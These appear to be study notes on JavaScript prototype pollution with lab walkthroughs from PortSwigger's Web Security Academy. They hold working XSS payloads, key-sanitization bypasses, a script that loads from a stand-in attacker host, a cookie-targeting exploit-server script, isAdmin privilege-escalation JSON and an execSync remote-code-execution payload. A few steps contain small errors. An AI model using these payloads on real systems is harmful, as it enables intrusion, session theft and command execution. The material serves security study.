*Using DOM invader is recommended*

## What is prototype pollution?
Every object in JavaScript has a built-in property, which is called its prototype
A JavaScript vulnerability that enables an attacker to add arbitrary properties to global object prototypes

If the application subsequently handles an attacker-controlled property in an unsafe way, this can potentially be chained with other vulnerabilities. In client-side JavaScript, this commonly leads to DOM XSS, while server-side prototype pollution can even result in remote code execution

## What is an object in JavaScript?
JavaScript object is a collection of ```key:value``` pairs known as propreties.


```
const user =  {
    username: "wiener",
    userId: 01234,
    isAdmin: false
}
```


Now we can access this using 
```
user.useranme  // "wiener"
user['userId'] // 01234
```

With this JavaScript could may also contain executable functions. In this case the functions known as methods.

```
const user =  {
    username: "wiener",
    userId: 01234,
    exampleMethod: function(){
        // do something
    }
}
```

Objects in JavaScript are linked to another object of some kind which is know as prototype. 

```
let myObject = {};
Object.getPrototypeOf(myObject);    // Object.prototype

let myString = "";
Object.getPrototypeOf(myString);    // String.prototype

let myArray = [];
Object.getPrototypeOf(myArray);	    // Array.prototype

let myNumber = 1;
Object.getPrototypeOf(myNumber);    // Number.prototype
```

Objects automatically inherit all of the properties of their assigned prototype, unless they already have their own property with the same key.



## How does object inheritance work in JavaScript?
Whenever you reference a property of an object, the JavaScript engine first tries to access this directly on the object itself. If the object doesn't have a matching property, the JavaScript engine looks for it on the object's prototype instead


## The prototype chain

Note that an object's prototype is just another object, which should also have its own prototype, and so on. As virtually everything in JavaScript is an object under the hood, this chain ultimately leads back to the top-level Object.prototype, whose prototype is simply null. 


## Accessing an object's prototype using `__proto__`
Every object has a special property that you can use to access its prototype. Although this doesn't have a formally standardized name, `__proto__` is the de facto standard used by most browsers


`__proto__` can be accessed via the dot method or the brackets 

```
username.__proto__
username['__proto__']
```

We can even chain `__proto__` using the following methods.

```
username.__proto__                        // String.prototype
username.__proto__.__proto__              // Object.prototype
username.__proto__.__proto__.__proto__    // null
```

## Modifying prototypes


Although it's generally considered bad practice, it is possible to modify JavaScript's built-in prototypes just like any other object. This means developers can customize or override the behavior of built-in methods, and even add new methods to perform useful operations

Lets take an example or `trim()` method for string now it's a inbuilt prototype before this developer used to use something like

```
String.prototype.removeWhitespace = function(){
    // remove leading and trailing whitespace
}
```

Thanks to the prototypal inheritance, all strings would then have access to this method

```
let searchTerm = "  example ";
searchTerm.removeWhitespace();    // "example"
```

## How do prototype pollution vulnerabilities arise?
Prototype pollution vulnerabilities typically arise when a JavaScript function recursively merges an object containing user-controllable properties into an existing object, without first sanitizing the keys. This can allow an attacker to inject a property with a key like `__proto__`, along with arbitrary nested properties.

 Due to the special meaning of `__proto__` in a JavaScript context, the merge operation may assign the nested properties to the object's prototype instead of the target object itself. As a result, the attacker can pollute the prototype with properties containing harmful values, which may subsequently be used by the application in a dangerous way.

It's possible to pollute any prototype object, but this most commonly occurs with the built-in global `Object.prototype`. 


Successful exploitation of prototype pollution requires the following key components:

* A prototype pollution source - This is any input that enables you to poison prototype objects with arbitrary properties.
* A sink - In other words, a JavaScript function or DOM element that enables arbitrary code execution.
* An exploitable gadget - This is any property that is passed into a sink without proper filtering or sanitization.

## Prototype pollution sources
A prototype pollution source is any user-controllable input that enables you to add arbitrary properties to prototype objects. The most common sources are as follows: 

* The URL via either the query or fragment string (hash) 
* JSON-based input 
* Web messages



## Prototype pollution via the URL
 Consider the following URL, which contains an attacker-constructed query string: 

```
https://vulnerable-website.com/?__proto__[evilProperty]=payload
```

Here the recursive merge operation may assign the value of `evilProperty` using a statement equivalent to the following:

```
targetObject.__proto__.evilProperty = 'payload';
```

Assuming that the target object uses the default `Object.prototype`, all objects in the JavaScript runtime will now inherit `evilProperty`, unless they already have a property of their own with a matching key

## Prototype pollution via JSON input

`JSON.parse()` also treats any key in the JSON object as an arbitrary string, including things like `__proto__`. This provides another potential vector for prototype pollution. 


Let's say an attacker injects the following malicious JSON

```
{
    "__proto__": {
        "evilProperty": "payload"
    }
}
```

If this is converted into a JavaScript object via the JSON.parse() method, the resulting object will in fact have a property with the key `__proto__`:

```
const objectLiteral = {__proto__: {evilProperty: 'payload'}};
const objectFromJson = JSON.parse('{"__proto__": {"evilProperty": "payload"}}');

objectLiteral.hasOwnProperty('__proto__');     // false
objectFromJson.hasOwnProperty('__proto__');    // true
```

If the object created via JSON.parse() is subsequently merged into an existing object without proper key sanitization, this will also lead to prototype pollution during the assignment.


## Prototype pollution sinks

A prototype pollution sink is essentially just a JavaScript function or DOM element that you're able to access via prototype pollution, which enables you to execute arbitrary JavaScript or system commands

As prototype pollution lets you control properties that would otherwise be inaccessible, this potentially enables you to reach a number of additional sinks within the target application. Developers who are unfamiliar with prototype pollution may wrongly assume that these properties are not user controllable, which means there may only be minimal filtering or sanitization in place.

## Prototype pollution gadgets
A gadget provides a means of turning the prototype pollution vulnerability into an actual exploit. This is any property that is

* Used by the application in an unsafe way, such as passing it to a sink without proper filtering or sanitization
* Attacker-controllable via prototype pollution. In other words, the object must be able to inherit a malicious version of the property added to the prototype by an attacker. 

### Example of a prototype pollution gadget
If a property that represents a particular option is not present, a predefined default option is often used instead. A simplified example may look something like this: 

```
let transport_url = config.transport_url || defaults.transport_url;
```

Now imagine the library code uses this transport_url to add a script reference to the page:

```
let script = document.createElement('script');
script.src = `${transport_url}/example.js`;
document.body.appendChild(script);
```

If the website's developers haven't set a `transport_url` property on their config object, this is a potential gadget

In cases where an attacker is able to pollute the global Object.prototype with their own `transport_url` property, this will be inherited by the config object and, therefore, set as the src for this script to a domain of the attacker's choosing.

If the prototype can be polluted via a query parameter, for example, the attacker would simply have to induce a victim to visit a specially crafted URL to cause their browser to import a malicious JavaScript file from an attacker-controlled domain


```
https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net
```

 By providing a data: URL, an attacker could also directly embed an XSS payload within the query string as follows:

```
https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//
```
Note that the trailing // in this example is simply to comment out the hardcoded /example.js suffix. 


## Finding client-side prototype pollution sources manually

Finding prototype pollution sources manually is largely a case of trial and error. In short, you need to try different ways of adding an arbitrary property to `Object.prototype` until you find a source that works.

When testing for client-side vulnerabilities, this involves the following high-level steps


1. Try to inject an arbitrary property via the query string, URL fragment, and any JSON input. For example: 

```
vulnerable-website.com/?__proto__[foo]=bar 
```
2. In your browser console, inspect `Object.prototype` to see if you have successfully polluted it with your arbitrary property: 

```
Object.prototype.foo
// "bar" indicates that you have successfully polluted the prototype
// undefined indicates that the attack was not successful
```
3. If the property was not added to the prototype, try using different techniques, such as switching to dot notation rather than bracket notation, or vice versa: 
```
vulnerable-website.com/?__proto__.foo=bar
```
4. Repeat this process for each potential source.

*Note If neither of these techniques is successful, you may still be able to pollute the prototype via its constructor.*


## Finding client-side prototype pollution gadgets manually

Once you've identified a source that lets you add arbitrary properties to the global `Object.prototype`, the next step is to find a suitable gadget that you can use to craft an exploit.


* Look through the source code and identify any properties that are used by the application or any libraries that it imports
* In Burp, enable response interception **(Proxy > Options > Intercept server responses)** and intercept the response containing the JavaScript that you want to test
* Add a `debugger` statement at the start of the script, then forward any remaining requests and responses
* In Burp's browser, go to the page on which the target script is loaded. The `debugger` statement pauses execution of the script.
* While the script is still paused, switch to the console and enter the following command, replacing `YOUR-PROPERTY` with one of the properties that you think is a potential gadget: 
    ```
    Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', {
        get() {
            console.trace();
            return 'polluted';
        }
    })
    ```
    The property is added to the global `Object.prototype`, and the browser will log a stack trace to the console whenever it is accessed.

* Press the button to continue execution of the script and monitor the console. If a stack trace appears, this confirms that the property was accessed somewhere within the application.
* Expand the stack trace and use the provided link to jump to the line of code where the property is being read
* Using the browser's debugger controls, step through each phase of execution to see if the property is passed to a sink, such as `innerHTML` or `eval()`.
* Repeat this process for any properties that you think are potential gadgets.


*Using DOM invader is recommended*



## Prototype pollution via the constructor

A common defence is just to remove `__proto__` from user input.

Unless objectes prototype is set to null, every JavaScript object has a constructor property, which contains a reference to the constructor function that was used to create it. You can create a new object either using literal syntax or by explicitly invoking the Object() constructor as follows:

```
let myObjectLiteral = {};
let myObject = new Object();
```

You can then reference the Object() constructor via the built-in constructor property: 

```
let myObjectLiteral = {};
let myObject = new Object();
```

You can then reference the Object() constructor via the built-in constructor property

```
myObjectLiteral.constructor            // function Object(){...}
myObject.constructor                   // function Object(){...}
```


**Remember that functions are also just objects under the hood**. Each constructor function has a prototype property, which points to the prototype that will be assigned to any objects that are created by this constructor. As a result, you can also access any object's prototype as follows: 

```
myObject.constructor.prototype        // Object.prototype
myString.constructor.prototype        // String.prototype
myArray.constructor.prototype         // Array.prototype
```

As myObject.constructor.prototype is equivalent to `myObject.__proto__`, this provides an alternative vector for prototype pollution. 


## Bypassing flawed key sanitization

An obvious way in which websites attempt to prevent prototype pollution is by sanitizing property keys before merging them into an existing object
```
vulnerable-website.com/?__pro__proto__to__.gadget=payload
```

If the sanitization process just strips the string `__proto__` without repeating this process more than once, this would result in the following URL, which is a potentially valid prototype pollution source: 

```
vulnerable-website.com/?__proto__.gadget=payload 
```


## Prototype pollution in external libraries
It's extremly suggested to use Dom invader as it's quick as well as finds injection point which maybe tricky to find otherwise.



## Prototype pollution via browser APIs

There are a number of widespread prototype pollution gadgets in the JavaScript APIs commonly provided in browsers.

## Prototype pollution via fetch()
The fetch() method accepts two arguments:

1. The URL to which you want to send the request.
2. An options object that lets you to control parts of the request, such as the method, headers, body parameters, and so on

    The following is an example of how you might send a `POST` request using `fetch()`:

    ```
    fetch('https://normal-website.com/my-account/change-email', {
        method: 'POST',
        body: 'user=carlos&email=carlos%40ginandjuice.shop'
    })
    ```
    As you can see, we've explicitly defined method and body properties, but there are a number of other possible properties that we've left undefined.

    If an attacker can find a suitable source, they could potentially pollute Object.prototype with their own headers property. This may then be inherited by the options object passed into fetch() and subsequently used to generate the request. 

     This can lead to a number of issues. For example, the following code is potentially vulnerable to DOM XSS via prototype pollution: 

    ```
    fetch('/my-products.json',{method:"GET"})
    .then((response) => response.json())
    .then((data) => {
        let username = data['x-username'];
        let message = document.querySelector('.message');
        if(username) {
            message.innerHTML = `My products. Logged in as <b>${username}</b>`;
        }
        let productList = document.querySelector('ul.products');
        for(let product of data) {
            let product = document.createElement('li');
            product.append(product.name);
            productList.append(product);
        }
    })
    .catch(console.error);
    ```
    To exploit this, an attacker could pollute Object.prototype with a headers property containing a malicious x-username header as follows: 
    ```
    ?__proto__[headers][x-username]=<img/src/onerror=alert(1)>
    ```

    Let's assume that server-side, this header is used to set the value of the x-username property in the returned JSON file. In the vulnerable client-side code above, this is then assigned to the username variable, which is later passed into the innerHTML sink, resulting in DOM XSS. 

    *Note:  You can use this technique to control any undefined properties of the options object passed to fetch(). This may enable you to add a malicious body to the request, for example.*


## Prototype pollution via Object.defineProperty()
Developers with some knowledge of prototype pollution may attempt to block potential gadgets by using the Object.defineProperty() method. This enables you to set a non-configurable, non-writable property directly on the affected object as follows.

```
Object.defineProperty(vulnerableObject, 'gadgetProperty', {
    configurable: false,
    writable: false
})
```

Just like the fetch() method we looked at earlier, `Object.defineProperty()` accepts an options object, known as a "descriptor".


## Server-side prototype pollution

Due to the emergence of server-side runtimes, such as the hugely popular Node.js, JavaScript is now widely used to build servers, APIs, and other back-end applications. Logically, this means that it's also possible for prototype pollution vulnerabilities to arise in server-side contexts.


## Why is server-side prototype pollution more difficult to detect?

* No source code access 
* Lack of developers tool
* Could lead to DOS attack 
* Pollution persistence - We cannot reset the data once the server is polluted unlike client side.


## Detecting server-side prototype pollution via polluted property reflection

Developers often forgets about the fact that javaScript ```for..in``` iterates through overall of an objects enumerable properties. 

*Test*

```
const myObject = { a: 1, b: 2 };

// pollute the prototype with an arbitrary property
Object.prototype.foo = 'bar';

// confirm myObject doesn't have its own foo property
myObject.hasOwnProperty('foo'); // false

// list names of properties of myObject
for(const propertyKey in myObject){
    console.log(propertyKey);
}

```


## Status code override

Server-side JavaScript frameworks like Express allow developers to set custom HTTP response statuses. In the case of errors, a JavaScript server may issue a generic HTTP response, but include an error object in JSON format in the body. This is one way of providing additional details about why an error occurred, which may not be obvious from the default HTTP status.

## JSON spaces override
The Express framework provides a json spaces option, which enables you to configure the number of spaces used to indent any JSON data in the response. In many cases, developers leave this property undefined as they're happy with the default value, making it susceptible to pollution via the prototype chain. 

## Charset override
Express servers often implement so-called "middleware" modules that enable preprocessing of requests before they're passed to the appropriate handler function. For example, the body-parser module is commonly used to parse the body of incoming requests in order to generate a req.body object. This contains another gadget that you can use to probe for server-side prototype pollution

## Scanning for server-side prototype pollution sources 
1. Install the Server-Side Prototype Pollution Scanner extension from the BApp Store and make sure that it is enabled 
2. Explore the target website using Burp's browser to map as much of the content as possible and accumulate traffic in the proxy history. 
3. In Burp, go to the Proxy > HTTP history tab
4. Filter the list to show only in-scope items. 
5. Select all items in the list.
6. Right-click your selection and go to Extensions > Server-Side Prototype Pollution Scanner > Server-Side Prototype Pollution, then select one of the scanning techniques from the list.  
7. When prompted, modify the attack configuration if required, then click OK to launch the scan


## Bypassing input filters for server-side prototype pollution 

* Obfuscate the prohibited keywords so they're missed during the sanitization. For more information, see Bypassing flawed key sanitization. 
* Access the prototype via the constructor property instead of ```__proto__```.



## Remote code execution via server-side prototype pollution
While client-side prototype pollution typically exposes the vulnerable website to DOM XSS, server-side prototype pollution can potentially result in remote code execution (RCE).

## Identifying a vulnerable request
Some of Node's functions for creating new child processes accept an optional shell property, which enables developers to set a specific shell, such as bash, in which to run commands. By combining this with a malicious NODE_OPTIONS property, you can pollute the prototype in a way that causes an interaction with Burp Collaborator whenever a new Node process is created: 

```
"__proto__": {
    "shell":"node",
    "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com"
}
```

*The escaped double-quotes in the hostname aren't strictly necessary. However, this can help to reduce false positives by obfuscating the hostname to evade WAFs and other systems that scrape for hostnames.* 


## Remote code execution via child_process.fork() 
Methods such as child_process.spawn() and child_process.fork() enable developers to create new Node subprocesses. The fork() method accepts an options object in which one of the potential options is the execArgv property. This is an array of strings containing command-line arguments that should be used when spawning the child process. If it's left undefined by the developers, this potentially also means it can be controlled via prototype pollution

```
"execArgv": [
    "--eval=require('<module>')"
]
```
In addition to fork(), the child_process module contains the execSync() method, which executes an arbitrary string as a system command. By chaining these JavaScript and command injection sinks, you can potentially escalate prototype pollution to gain full RCE capability on the server. 


## Remote code execution via child_process.execSync()
the previous example, we injected the `child_process.execSync()` sink ourselves via the `--eval` command line argument. In some cases, the application may invoke this method of its own accord in order to execute system commands.

Just like `fork()`, the `execSync()` method also accepts options object, which may be pollutable via the prototype chain. Although this doesn't accept an execArgv property, you can still inject system commands into a running child process by simultaneously polluting both the shell and input properties

* The `input` option is just a string that is passed to the child process's stdin stream and executed as a system command by `execSync()`. As there are other options for providing the command, such as simply passing it as an argument to the function, the input property itself may be left undefined.

*  The shell option lets developers declare a specific shell in which they want the command to run. By default, `execSync()` uses the system's default shell to run commands, so this may also be left undefined. 


## Preventing prototype pollution vulnerabilities
1. Sanitizing property keys
2. Preventing changes to prototype objects - 
    ```
    Object.freeze(Object.prototype);
    ```
3. Preventing an object from inheriting properties
    ```
        let myObject = Object.create(null);
        Object.getPrototypeOf(myObject);    // null
    ```


# LAB

## Lab: DOM XSS via client-side prototype pollution

Steps taken to solve the lab

1. Checked if I could pollute the prototype using the query

    ```
    https://0a99008904962a90805a264100ff00e6.web-security-academy.net/?__proto__[foo]=bar
    ```
2. On browser console entered if foo prototype is added or not 

    ```
    > Object.foo
    bar
    ```
3. Checked the javascript code 

    ```
    async function searchLogger() {
    let config = {params: deparam(new URL(location).searchParams.toString())};

        if(config.transport_url) {
            let script = document.createElement('script');
            script.src = config.transport_url;
            document.body.appendChild(script);
        }

        if(config.params && config.params.search) {
            await logQuery('/logger', config.params);
        }
    }
    ```

    Here `if` statement is checking for config.transport_url, which has not been defined so we polluted `transport_url` with out data.

    ```
    https://0a99008904962a90805a264100ff00e6.web-security-academy.net/?__proto__[transport_url]=data:,alert(1)//
    ```

    Here `//` is for comment rest of the code which appends to transport_url.

    Which solved the lab


### Using Dom invader 

1. Enable Dom invader with prototype pollution attack enabled
2. Open the dev tools and head over to DOM invader extension
3. Now You will find two source, click on scan for gadgets
4. Once the scan is completed open the dev tools and click on exploit.


## Lab: DOM XSS via an alternative prototype pollution vector

Steps taken to solve the lab 

1. Injected the payload using query parameter.

```
https://0ae8006d03331ec3803435c300f40080.web-security-academy.net/?__proto__[foo]=bar
```
2. On browser console entered if foo prototype is added or not 

    ```
    > Object.foo
    undefined
    ```
3. Again injected the payload using dot

    ```
    https://0ae8006d03331ec3803435c300f40080.web-security-academy.net/?__proto__[foo]=bar

    ```
4. On browser console entered if foo prototype is added or not 

    ```
    > Object.foo
    bar
    ```

    It worked

    Now analyzing the JavaScript code.

    ```
    async function searchLogger() {
        window.macros = {};
        window.manager = {params: $.parseParams(new URL(location)), macro(property) {
                if (window.macros.hasOwnProperty(property))
                    return macros[property]
            }};
        let a = manager.sequence || 1;
        manager.sequence = a + 1;

        eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');

        if(manager.params && manager.params.search) {
            await logQuery('/logger', manager.params);
        }
    }

    ```

    Here the `manager.squence` is not defined which means it will simply inherit from `Object.prototype.squence`

    which is being passed through `eval()`

    Which mean we can execute `alert()`
    But as 1 is being added in the code it's producing error on 

    We can solve this by addind and `-` `minus` sign which will retrun 
    ``NaN``

    The final payload looks like.

    ```
    https://0ae8006d03331ec3803435c300f40080.web-security-academy.net/?__proto__.sequence=alert(1)-1
    ```



### Dom invader solution

1. Enable Dom and prototype pollution
2. Potential method of injectio will be detected 
3. Click on scan for gadget 
4. Now click on exploit 
5. It will not triger the XSS as 1 is being added to the `manager.sequence` Here we can add `-` `minus` to the payload and it worked.




## Lab: Client-side prototype pollution via flawed sanitization

1. Inject the following payload 
    ```
    https://0a5700f703981e3e80b73f67006c00bb.web-security-academy.net/?__proto__[foo]=bar
    ```
2. It got blocked as the sanitization has removed ```__proto__```
3. Not inject the following payload 
    ```
    https://0a5700f703981e3e80b73f67006c00bb.web-security-academy.net/?__pro__proto__to__[foo]=bar
    ```

    As ```__proto__``` has been removed rest of the payload becam ```__proto__[foo]=bar```

    Which got injected as checking the console with ```Object.foo``` returns ```bar```

4. Analayzing the javaScript code.
    ```
    async function searchLogger() {
    let config = {params: deparam(new URL(location).searchParams.toString())};
        if(config.transport_url) {
            let script = document.createElement('script');
            script.src = config.transport_url;
            document.body.appendChild(script);
        }
        if(config.params && config.params.search) {
            await logQuery('/logger', config.params);
        }
    }

    ```
5. As transport_url is not configured we could inject the following payload.

    ```
    https://0a5700f703981e3e80b73f67006c00bb.web-security-academy.net/?__pro__proto__to__[transport_url]=data:,alert(1)
    ```
6. It worked.


## Lab: Client-side prototype pollution in third-party libraries
1. Enable dom invader and prototype pollution 
2. Now It will find a sink 
3. Click on scan for gadgets
4. Next It will find a exploit once it's clicked it will trigger xss payload.
5. Store the following code on the Exploit server 
    ```
    <script>
    location="https://YOURWEBCECURITYACADEMYCODE.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29"
    </script>
    ```
6. Save and Deliver to the victim and the payload will be executed.


## Lab: Client-side prototype pollution via browser APIs

1. Inject the following payload
    ```
    https://0ac60080032b4d5480db0ddd00a8007f.web-security-academy.net/?__proto__[foo]=bar
    ```

2. Check on Browser Console
    ```
    > foo
    bar 
    ```
3. Now check the source code
    ```
    async function searchLogger() {
    let config = {params: deparam(new URL(location).searchParams.toString()), transport_url: false};
    Object.defineProperty(config, 'transport_url', {configurable: false, writable: false});
        if(config.transport_url) {
            let script = document.createElement('script');
            script.src = config.transport_url;
            document.body.appendChild(script);
        }
        if(config.params && config.params.search) {
            await logQuery('/logger', config.params);
        }
    }
    ```

4. Here on 
    ```
        Object.defineProperty(config, 'transport_url', {configurable: false, writable: false});
    ```
    The default value is not configued 
    we can inject payload like 
    
    ```
    https://0ac60080032b4d5480db0ddd00a8007f.web-security-academy.net/?__proto__[value]=data:,alert(1)//
    ```
Which executes the payload.


# Lab: Privilege escalation via server-side prototype pollution

Steps taken to solve the lab

1. Logged in to the account via 'http://0a05003204475a6e8015588a00dc00a1.web-security-academy.net/login'
2. Update the address records which sent the following code.
    ```json
    {
        "address_line_1": "cool1",
        "address_line_2": "cool2",
        "city": "cool3",
        "postcode": "cool4",
        "country": "cool5",
        "sessionId": "JrjrCIIdmwkTXjL8wKFQFYisAmuulyq5"
    }
    ```
3. We got the following response 
    ```json
    {
        "username": "wiener",
        "firstname": "Peter",
        "lastname": "Wiener",
        "address_line_1": "cool1",
        "address_line_2": "cool2",
        "city": "cool3",
        "postcode": "cool4",
        "country": "cool5",
        "isAdmin": false
    }
    ```
4. Now we inject the following payload 

    ```json
    {
        "address_line_1": "cool1",
        "address_line_2": "cool2",
        "city": "cool3",
        "postcode": "cool4",
        "country": "cool5",
        "sessionId": "JrjrCIIdmwkTXjL8wKFQFYisAmuulyq5",
        "__proto__": {
            "foo": "bar"
        }
    }
    ```

5. Now you can notice that the `__proto__` is not being shown and only `foo:bar` is being reflected.

6. Now we can inject the following json data 
    ```
    {
        "address_line_1": "cool1",
        "address_line_2": "cool2",
        "city": "cool3",
        "postcode": "cool4",
        "country": "cool5",
        "sessionId": "JrjrCIIdmwkTXjL8wKFQFYisAmuulyq5",
        "__proto__": {
            "isAdmin": "true"
        }
    }
    ```

    Which provided us admin access and now we should be able to delete carlos.


## Lab: Detecting server-side prototype pollution without polluted property reflection
1. Login into the account 
2. Change address 
3. Now add the following code 
    ```json
    {
        "address_line_1": "cool1",
        "address_line_2": "cool2",
        "city": "cool3",
        "postcode": "cool4",
        "country": "cool5",
        "sessionId": "JrjrCIIdmwkTXjL8wKFQFYisAmuulyq5",
        "__proto__": {
            "foo": "bar"
        }
    }
    ```
4. The response does not contains the prototype of foo.
5. Now break application intentionally by removing one of the comma.
    ```json
    {
        "address_line_1": "cool1",
        "address_line_2": "cool2",
        "city": "cool3",
        "postcode": "cool4",
        "country": "cool5",
        "sessionId": "JrjrCIIdmwkTXjL8wKFQFYisAmuulyq5"
        "__proto__": {
            "foo": "bar"
        }
    }
    ```
6. Now update the status code.
    ```json
    {
        "address_line_1": "cool1",
        "address_line_2": "cool2",
        "city": "cool3",
        "postcode": "cool4",
        "country": "cool5",
        "sessionId": "JrjrCIIdmwkTXjL8wKFQFYisAmuulyq5",
        "__proto__": {
            "status": 555
        }
    }
    ```
## Lab: Bypassing flawed input filters for server-side prototype pollution 
1. Login to account
2. Change / Modify the address 
3. Update the json object with the following 
    ```json
    {
    "address_line_1": "Wiener HQs",
    "address_line_2": "One Wiener Way",
    "city": "Wienerville",
    "postcode": "BU1 1RP",
    "country": "UK",
    "sessionId": "HQBz7c9cyKO76s0us9bUl6wFRQHkIiYC",
    "__proto__": {
        "json space": 10
        }
    }
    ```
    It didn't worked
4. Now update the json object with the following

    ```json 
    {
    "address_line_1": "Wiener HQs",
    "address_line_2": "One Wiener Way",
    "city": "Wienerville",
    "postcode": "BU1 1RP",
    "country": "UK",
    "sessionId": "HQBz7c9cyKO76s0us9bUl6wFRQHkIiYC",
    "constructor": {
        "prototype": {
        "json spaces": 10
        }
    }
    }
    ```
    In burp response tab change prettify to raw
5. YOu can notice the difference 
6. Now Send the following request 

    ```json 
    {
    "address_line_1": "Wiener HQs",
    "address_line_2": "One Wiener Way",
    "city": "Wienerville",
    "postcode": "BU1 1RP",
    "country": "UK",
    "sessionId": "HQBz7c9cyKO76s0us9bUl6wFRQHkIiYC",
    "constructor": {
        "prototype": {
        "isAdmin": true
        }
    }
    }
    ```
7. Now we got the access of admin panel and we can delete carlos user and solve the lab

## Lab: Remote code execution via server-side prototype pollution 
1. Login to account 
2. Update address
3. Check if you are able to inject the `__proto__` payload
4. It's reflecting 
5. Now add the followng exploit
    ```json
    {
        "address_line_1": "Wiener HQs",
        "address_line_2": "One Wiener Way",
        "city": "Wienerville",
        "postcode": "BU1 1RP",
        "country": "UK",
        "sessionId": "bDkgPHB9d2HbImMaUkrTNzXLCcFxFMgh",
        "__proto__": {
            "execArgv": [
            "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
            ]
        }
    }
    ```
6. It worked

